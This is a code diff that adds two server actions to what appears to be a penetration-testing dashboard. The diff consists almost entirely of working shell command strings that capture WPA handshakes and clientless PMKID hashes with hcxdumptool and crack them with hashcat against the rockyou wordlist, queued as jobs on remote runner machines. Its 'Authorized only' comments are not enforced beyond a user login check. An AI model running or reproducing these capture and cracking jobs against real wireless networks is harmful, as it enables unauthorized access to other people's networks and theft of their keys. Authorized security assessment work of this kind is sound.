@@ -187,6 +187,56 @@ export async function crackHandshake(formData: FormData) {
 }
 
 /**
+ * GPU/CPU crack via hashcat (mode 22000). Converts the capture to .22000 with
+ * hcxpcapngtool, then runs hashcat against a wordlist (rockyou default). Far
+ * faster than aircrack-ng on a GPU. Authorized only.
+ */
+export async function crackHashcat(formData: FormData) {
+  const email = await requireUser();
+  const runnerId = String(formData.get("runnerId") ?? "");
+  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
+  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
+    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
+  }
+  const cmd =
+    `bash -lc 'command -v hcxpcapngtool >/dev/null || { echo "Install hcxtools first"; exit 0; }; ` +
+    `command -v hashcat >/dev/null || { echo "Install hashcat first"; exit 0; }; ` +
+    `hcxpcapngtool -o /tmp/rdhs.22000 /tmp/rdhs-01.cap >/dev/null 2>&1; ` +
+    `[ -s /tmp/rdhs.22000 ] || { echo "No PMKID/handshake in capture — capture first"; exit 0; }; ` +
+    `W=/usr/share/wordlists/rockyou.txt; [ -f "$W" ] || { [ -f "$W.gz" ] && gunzip -kf "$W.gz"; }; ` +
+    `echo "Cracking with hashcat (m22000)…"; hashcat -m 22000 /tmp/rdhs.22000 "$W" --quiet; ` +
+    `echo "== result =="; hashcat -m 22000 /tmp/rdhs.22000 --show'`;
+  await prisma.job.create({
+    data: { runnerId, tool: "custom", target: `wifi-crack:${bssid}`, args: cmd, queuedBy: email },
+  });
+  redirect("/dashboard/jobs?queued=1");
+}
+
+/**
+ * Clientless PMKID capture (hcxdumptool) — grabs a crackable hash from the AP
+ * itself without needing a connected client, then converts to hashcat 22000.
+ * Authorized only.
+ */
+export async function capturePmkid(formData: FormData) {
+  const email = await requireUser();
+  const runnerId = String(formData.get("runnerId") ?? "");
+  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
+  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
+    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
+  }
+  const cmd =
+    `bash -lc '${findMonSh()}; command -v hcxdumptool >/dev/null || { echo "Install hcxdumptool first"; exit 0; }; ` +
+    `rm -f /tmp/rdpmkid.pcapng; ` +
+    `timeout 60 hcxdumptool -i "$M" -w /tmp/rdpmkid.pcapng --rds=1 >/dev/null 2>&1; ` +
+    `command -v hcxpcapngtool >/dev/null && hcxpcapngtool -o /tmp/rdhs.22000 /tmp/rdpmkid.pcapng 2>/dev/null; ` +
+    `if [ -s /tmp/rdhs.22000 ]; then echo "PMKID/hash captured → /tmp/rdhs.22000. Crack it with the hashcat button."; else echo "No PMKID captured (AP may not be vulnerable; try a handshake instead)."; fi'`;
+  await prisma.job.create({
+    data: { runnerId, tool: "custom", target: `wifi-pmkid:${bssid}`, args: cmd, queuedBy: email },
+  });
+  redirect("/dashboard/jobs?queued=1");
+}
+
+/**
  * Save a WiFi security review as findings on an authorized engagement — turns the
  * assessment into report-ready items (recomputed server-side; one finding per
  * real issue).
@@ -205,6 +255,7 @@ export async function saveWifiFindings(formData: FormData) {
     cipher: String(formData.get("cipher") ?? ""),
     auth: String(formData.get("auth") ?? ""),
     clients: Number(formData.get("clients") ?? 0) || 0,
+    crackedKey: String(formData.get("crackedKey") ?? "").slice(0, 128),
   };
   const bssid = String(formData.get("bssid") ?? "").slice(0, 32);
   const where = `${ap.ssid || "(hidden)"}${bssid ? ` (${bssid})` : ""}`;
